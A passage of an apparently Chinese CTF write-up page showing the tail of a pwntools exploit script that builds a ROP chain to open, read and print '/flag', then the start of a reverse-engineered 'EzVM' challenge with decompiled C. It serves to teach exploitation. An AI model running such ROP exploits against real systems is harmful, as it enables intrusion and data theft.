style="color:#DBD7CAEE">pop_rax_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000004487a7</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000414f46</span><br><span style="color:#DBD7CAEE">main </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">401AE2</span><br><span style="color:#DBD7CAEE">mov_rdi_rax_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000480192</span><br><span style="color:#DBD7CAEE">pop_r12_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000040262d</span><br><br><span style="color:#758575DD"># 0x0000000000427720: mov rdx, qword ptr [rsi - 8]; mov qword ptr [rdi - 8], rdx; ret;</span><br><span style="color:#758575DD"># 0x0000000000448c55: mov rdi, qword ptr [r12]; call rbx;</span><br><span style="color:#758575DD"># 0x000000000046d4d3: mov eax, 1; ret;</span><br><br><span style="color:#DBD7CAEE">pop_rcx_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000471183</span><br><span style="color:#DBD7CAEE">magic </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000427720</span><br><span style="color:#DBD7CAEE">mov_rdi_r12_call </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">448c55</span><br><span style="color:#DBD7CAEE">pop_rbx_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000401c00</span><br><span style="color:#DBD7CAEE">write </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">447C20</span><br><span style="color:#DBD7CAEE">mov_rax_r8_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">44ac44</span><br><span style="color:#DBD7CAEE">mov_eax_1_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">46d4d3</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 64</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4c9608</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> magic</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4c9000</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # read</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4c9000</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # open</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">mov_rdi_rax_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4c9500</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_rbx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">50</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # read</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_r12_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4c9600</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rbx_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> write</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> mov_rdi_r12_call</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#758575DD">  # write</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">sleep</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0.5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/flag</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="ezvm" class="scroll-target"><a href="#ezvm"><code class="hash inline-code">#</code>EzVM</a></h2>
<p>vm 题，逆向出的 vm 结构如下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959"> struct</span><span style="color:#59873A"> __attribute__</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">packed</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#59873A"> __attribute__</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#59873A">aligned</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">1</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#393A34"> Count</span><span style="color:#A0ADA0"> // sizeof=0x37</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959">     int</span><span style="color:#393A34"> code_len</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000004</span><span style="color:#393A34">     Code </span><span style="color:#AB5959">*</span><span style="color:#393A34">code</span><span style="color:#999999">;</span><br><span style="color:#B31D28;font-style:italic">0000000C</span><span style="color:#AB5959">     char</span><span style="color:#B07D48"> pad</span><span style="color:#1e754f">[</span><span style="color:#2F798A">31</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#B31D28;font-style:italic">0000002B</span><span style="color:#AB5959">     char</span><span style="color:#AB5959"> *</span><span style="color:#393A34">reg</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000033</span><span style="color:#AB5959">     int</span><span style="color:#393A34"> pc</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000037</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> Code</span><span style="color:#A0ADA0"> // sizeof=0x4</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000000</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> op</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000001</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> oper1</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000002</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> flags</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000003</span><span style="color:#AB5959">     char</span><span style="color:#393A34"> oper2</span><span style="color:#999999">;</span><br><span style="color:#AB5959">0</span><span style="color:#2F798A">0000004</span><span style="color:#999999"> </span><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676"> struct</span><span style="color:#80A665"> __attribute__</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">packed</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#80A665"> __attribute__</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#80A665">aligned</span><span style="color:#d4976c">(</span><span style="color:#4C9A91">1</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE"> Count</span><span style="color:#758575DD"> // sizeof=0x37</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676">     int</span><span style="color:#DBD7CAEE"> code_len</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000004</span><span style="color:#DBD7CAEE">     Code </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">;</span><br><span style="color:#FDAEB7;font-style:italic">0000000C</span><span style="color:#CB7676">     char</span><span style="color:#BD976A"> pad</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">31</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#FDAEB7;font-style:italic">0000002B</span><span style="color:#CB7676">     char</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">reg</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000033</span><span style="color:#CB7676">     int</span><span style="color:#DBD7CAEE"> pc</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000037</span><span style="color:#666666"> </span><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> Code</span><span style="color:#758575DD"> // sizeof=0x4</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000000</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> op</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000001</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> oper1</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000002</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> flags</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000003</span><span style="color:#CB7676">     char</span><span style="color:#DBD7CAEE"> oper2</span><span style="color:#666666">;</span><br><span style="color:#CB7676">0</span><span style="color:#4C9A91">0000004</span><span style="color:#666666"> </span><span style="color:#5eaab5">}</span><span style="color:#666666">;</span><br></code></pre></div>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#393A34">Count </span><span style="color:#AB5959">*</span><span style="color:#393A34">__fastcall </span><span style="color:#59873A">vm</span><span style="color:#2993a3">(</span><span style="color:#393A34">Count </span><span style="color:#AB5959">*</span><span style="color:#B07D48">count</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> op</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // eax</span><br><span style="color:#AB5959">  bool</span><span style="color:#393A34"> carry_in</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // al</span><br><span style="color:#393A34">  Count </span><span style="color:#AB5959">*</span><span style="color:#393A34">result</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rax</span><br><span style="color:#AB5959">  char</span><span style="color:#393A34"> oper2</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+18h] [rbp-18h]</span><br><span style="color:#AB5959">  char</span><span style="color:#393A34"> d_</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+18h] [rbp-18h]</span><br><span style="color:#AB5959">  bool</span><span style="color:#393A34"> val</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+1Ch] [rbp-14h]</span><br><span style="color:#AB5959">  bool</span><span style="color:#393A34"> b_</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+1Ch] [rbp-14h]</span><br><span style="color:#AB5959">  char</span><span style="color:#393A34"> v8</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+24h] [rbp-Ch]</span><br><span style="color:#393A34">  Code </span><span style="color:#AB5959">*</span><span style="color:#393A34">cur</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+28h] [rbp-8h]</span><br><br><span style="color:#393A34">  cur </span><span style="color:#999999">=</span><span style="color:#AB5959"> &#x26;</span><span style="color:#B07D48">count</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">code</span><span style="color:#1e754f">[</span><span style="color:#B07D48">count</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">pc</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#393A34">  val </span><span style="color:#999999">=</span><span style="color:#59873A"> read_val</span><span style="color:#1e754f">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#a65e2b">)</span><span style="color:#B07D48">cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">oper1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48"> cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">flags</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#393A34">    oper2 </span><span style="color:#999999">=</span><span style="color:#B07D48"> cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">oper2</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  else</span><br><span style="color:#393A34">    oper2 </span><span style="color:#999999">=</span><span style="color:#59873A"> read_val</span><span style="color:#1e754f">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#a65e2b">)</span><span style="color:#B07D48">cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">oper2</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">  b_ </span><span style="color:#999999">=</span><span style="color:#393A34"> val</span><span style="color:#999999">;</span><br><span style="color:#393A34">  d_ </span><span style="color:#999999">=</span><span style="color:#393A34"> oper2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#393A34">  op </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#1e754f">)</span><span style="color:#B07D48">cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">op</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> op </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">    carry_in </span><span style="color:#999999">=</span><span style="color:#59873A"> read_val</span><span style="color:#a65e2b">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">    v8 </span><span style="color:#999999">=</span><span style="color:#393A34"> carry_in </span><span style="color:#AB5959">^</span><span style="color:#393A34"> d_ </span><span style="color:#AB5959">^</span><span style="color:#393A34"> b_</span><span style="color:#999999">;</span><br><span style="color:#59873A">    write_val</span><span style="color:#a65e2b">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> b_ </span><span style="color:#AB5959">&#x26;</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34">carry_in </span><span style="color:#AB5959">|</span><span style="color:#393A34"> d_</span><span style="color:#a13865">)</span><span style="color:#AB5959"> |</span><span style="color:#393A34"> carry_in </span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34"> d_</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    write_val</span><span style="color:#a65e2b">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#a13865">)</span><span style="color:#B07D48">cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">oper1</span><span style="color:#999999">,</span><span style="color:#393A34"> v8</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  else</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#a13865">)</span><span style="color:#B07D48">cur</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">op</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 4</span><span style="color:#AB5959">u</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      goto</span><span style="color:#393A34"> LABEL_14</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    switch</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> op </span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#1E754F">      case</span><span style="color:#2F798A"> 3</span><span style="color:#999999">:</span><br><span style="color:#59873A">        write_val</span><span style="color:#a13865">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#bda437">)</span><span style="color:#393A34">cur</span><span style="color:#AB5959">-</span><span style="color:#AB5959">></span><span style="color:#B07D48">oper1</span><span style="color:#999999">,</span><span style="color:#393A34"> d_ </span><span style="color:#AB5959">|</span><span style="color:#393A34"> b_</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      case</span><span style="color:#2F798A"> 1</span><span style="color:#999999">:</span><br><span style="color:#59873A">        write_val</span><span style="color:#a13865">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#bda437">)</span><span style="color:#393A34">cur</span><span style="color:#AB5959">-</span><span style="color:#AB5959">></span><span style="color:#B07D48">oper1</span><span style="color:#999999">,</span><span style="color:#393A34"> d_ </span><span style="color:#AB5959">^</span><span style="color:#393A34"> b_</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      case</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#59873A">        write_val</span><span style="color:#a13865">(</span><span style="color:#393A34">count</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#bda437">)</span><span style="color:#393A34">cur</span><span style="color:#AB5959">-</span><span style="color:#AB5959">></span><span style="color:#B07D48">oper1</span><span style="color:#999999">,</span><span style="color:#393A34"> d_ </span><span style="color:#AB5959">&#x26;</span><span style="color:#B07D48"> b_</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      default</span><span style="color:#999999">:</span><br><span style="color:#393A34">LABEL_14:</span><br><span style="color:#59873A">        printf</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">未知操作码: 0x</span><span style="color:#A65E2B">%02x\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#bda437">(</span><span style="color:#AB5959">unsigned</span><span style="color:#393A34"> __int8</span><span style="color:#bda437">)</span><span style="color:#393A34">cur</span><span style="color:#AB5959">-</span><span style="color:#AB5959">></span><span style="color:#B07D48">op</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a13865">(</span><span style="color:#2F798A">1</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#393A34">  result </span><span style="color:#999999">=</span><span style="color:#393A34"> count</span><span style="color:#999999">;</span><br><span style="color:#AB5959">  ++</span><span style="color:#B07D48">count</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">pc</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> result</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#DBD7CAEE">Count </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">__fastcall </span><span style="color:#80A665">vm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">Count </span><span style="color:#CB7676">*</span><span style="color:#BD976A">count</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> op</span><span style="color:#666666">;</span><span style="color:#758575DD"> // eax</span><br><span style="color:#CB7676">  bool</span><span style="color:#DBD7CAEE"> carry_in</span><span style="color:#666666">;</span><span style="color:#758575DD"> // al</span><br><span style="color:#DBD7CAEE">  Count </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">result</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rax</span><br><span style="color:#CB7676">  char</span><span style="color:#DBD7CAEE"> oper2</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+18h] [rbp-18h]</span><br><span style="color:#CB7676">  char</span><span style="color:#DBD7CAEE"> d_</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+18h] [rbp-18h]</span><br><span style="color:#CB7676">  bool</span><span style="color:#DBD7CAEE"> val</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+1Ch] [rbp-14h]</span><br><span style="color:#CB7676">  bool</span><span style="color:#DBD7CAEE"> b_</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+1Ch] [rbp-14h]</span><br><span style="color:#CB7676">  char</span><span style="color:#DBD7CAEE"> v8</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+24h] [rbp-Ch]</span><br><span style="color:#DBD7CAEE">  Code </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">cur</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+28h] [rbp-8h]</span><br><br><span style="color:#DBD7CAEE">  cur </span><span style="color:#666666">=</span><span style="color:#CB7676"> &#x26;</span><span style="color:#BD976A">count</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">code</span><span style="color:#4d9375">[</span><span style="color:#BD976A">count</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">pc</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  val </span><span style="color:#666666">=</span><span style="color:#80A665"> read_val</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#d4976c">)</span><span style="color:#BD976A">cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">oper1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A"> cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">flags</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#DBD7CAEE">    oper2 </span><span style="color:#666666">=</span><span style="color:#BD976A"> cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">oper2</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  else</span><br><span style="color:#DBD7CAEE">    oper2 </span><span style="color:#666666">=</span><span style="color:#80A665"> read_val</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#d4976c">)</span><span style="color:#BD976A">cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">oper2</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  b_ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> val</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  d_ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> oper2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  op </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#4d9375">)</span><span style="color:#BD976A">cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">op</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> op </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 4</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span 